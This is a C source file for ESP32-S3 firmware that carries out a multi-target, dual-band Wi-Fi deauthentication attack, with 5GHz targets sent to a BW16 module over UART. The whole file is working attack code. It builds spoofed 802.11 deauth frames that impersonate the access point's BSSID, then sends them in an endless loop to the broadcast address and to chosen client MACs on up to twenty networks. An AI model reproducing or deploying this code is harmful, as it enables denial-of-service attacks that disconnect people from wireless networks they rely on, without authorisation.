/*
 * attack_deauth.c — Multi-target, multi-band Deauth Attack
 * 2.4GHz: ESP32-S3 native
 * 5GHz: BW16 via UART
 * 
 * Features:
 * - Multiple SSID/AP selection
 * - Continuous deauth until stopped
 * - Broadcast + client-specific deauth
 * - Dual-band support
 */

#include "attack_deauth.h"
#include "bw16_uart.h"
#include "esp_rom_sys.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_mac.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "DEAUTH";

// ==================== DATA STRUCTURES ====================
#define MAX_TARGETS 20

static TaskHandle_t g_deauth_task_handle = NULL;
static volatile bool g_deauth_running = false;

static deauth_target_t g_deauth_targets[MAX_TARGETS];
static int g_deauth_target_count = 0;
static uint8_t g_client_mac[6];
static int g_pkt_count = 100;    // Packets per target per round
static int g_pkt_delay = 10;     // Delay between packets in ms

static volatile uint64_t g_total_packets_sent = 0;

// ==================== SEND 2.4GHz DEAUTH PACKET ====================
static void send_deauth_packet_24ghz(uint8_t *bssid, uint8_t *client_mac, uint8_t channel) {
    // Switch to target channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_rom_delay_us(100);
    
    // Construct 802.11 deauth frame
    uint8_t packet[26] = {
        0xC0, 0x00,       // Frame Control: Deauth
        0x00, 0x00,       // Duration
        client_mac[0], client_mac[1], client_mac[2],  // Destination
        client_mac[3], client_mac[4], client_mac[5],
        bssid[0], bssid[1], bssid[2],                // Source (AP BSSID)
        bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2],                // BSSID
        bssid[3], bssid[4], bssid[5],
        0x00, 0x00,                                    // Sequence
        0x07, 0x00                                     // Reason: Class 3 frame from nonassociated STA
    };
    
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

// ==================== DEAUTH TASK ====================
static void deauth_task_func(void *params) {
    g_deauth_running = true;
    g_total_packets_sent = 0;
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    bool has_client = (memcmp(g_client_mac, broadcast, 6) != 0);
    
    ESP_LOGI(TAG, "🔥 Deauth started: %d targets", g_deauth_target_count);
    for (int i = 0; i < g_deauth_target_count; i++) {
        ESP_LOGI(TAG, "   Target %d: " MACSTR " (ch %d) [%s]",
                 i + 1,
                 MAC2STR(g_deauth_targets[i].bssid),
                 g_deauth_targets[i].channel,
                 g_deauth_targets[i].is_5ghz ? "5GHz" : "2.4GHz");
    }
    
    while (g_deauth_running) {
        for (int t = 0; t < g_deauth_target_count && g_deauth_running; t++) {
            if (g_deauth_targets[t].is_5ghz) {
                // Send via BW16 for 5GHz targets
                if (bw16_is_connected()) {
                    char json[256];
                    snprintf(json, sizeof(json),
                             "{\"targets\":[{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}]}",
                             g_deauth_targets[t].bssid[0], g_deauth_targets[t].bssid[1],
                             g_deauth_targets[t].bssid[2], g_deauth_targets[t].bssid[3],
                             g_deauth_targets[t].bssid[4], g_deauth_targets[t].bssid[5],
                             g_deauth_targets[t].channel);
                    bw16_deauth_start(json);
                    vTaskDelay(pdMS_TO_TICKS(500));
                    g_total_packets_sent += g_pkt_count;
                }
            } else {
                // Send via ESP32-S3 for 2.4GHz targets
                for (int p = 0; p < g_pkt_count && g_deauth_running; p++) {
                    // Send to broadcast
                    send_deauth_packet_24ghz(g_deauth_targets[t].bssid, broadcast,
                                              g_deauth_targets[t].channel);
                    g_total_packets_sent++;
                    
                    // Also send to specific client if not broadcast
                    if (has_client) {
                        send_deauth_packet_24ghz(g_deauth_targets[t].bssid, g_client_mac,
                                                  g_deauth_targets[t].channel);
                        g_total_packets_sent++;
                    }
                    
                    if (g_pkt_delay > 0) {
                        vTaskDelay(pdMS_TO_TICKS(g_pkt_delay));
                    }
                }
            }
        }
    }
    
    // Stop BW16 deauth if active
    if (bw16_is_connected()) {
        bw16_deauth_stop();
    }
    
    ESP_LOGI(TAG, "⏹️  Deauth stopped. Total packets sent: %llu", g_total_packets_sent);
    g_deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

// ==================== PUBLIC API ====================
void deauth_start(deauth_target_t *targets, int count, uint8_t *client_mac) {
    if (g_deauth_running) {
        deauth_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    if (count > MAX_TARGETS) count = MAX_TARGETS;
    
    memcpy(g_deauth_targets, targets, count * sizeof(deauth_target_t));
    g_deauth_target_count = count;
    
    if (client_mac) {
        memcpy(g_client_mac, client_mac, 6);
    } else {
        memset(g_client_mac, 0xFF, 6);
    }
    
    xTaskCreatePinnedToCore(deauth_task_func, "deauth_task", 4096, NULL, 5, 
                            &g_deauth_task_handle, 0);
    
    ESP_LOGI(TAG, "Deauth started with %d targets", count);
}

void deauth_stop(void) {
    g_deauth_running = false;
    if (g_deauth_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    
    // Stop BW16 deauth
    if (bw16_is_connected()) {
        bw16_deauth_stop();
    }
    
    g_deauth_target_count = 0;
    ESP_LOGI(TAG, "Deauth stopped");
}

bool deauth_is_running(void) {
    return g_deauth_running;
}

uint64_t deauth_get_packets_sent(void) {
    return g_total_packets_sent;
}
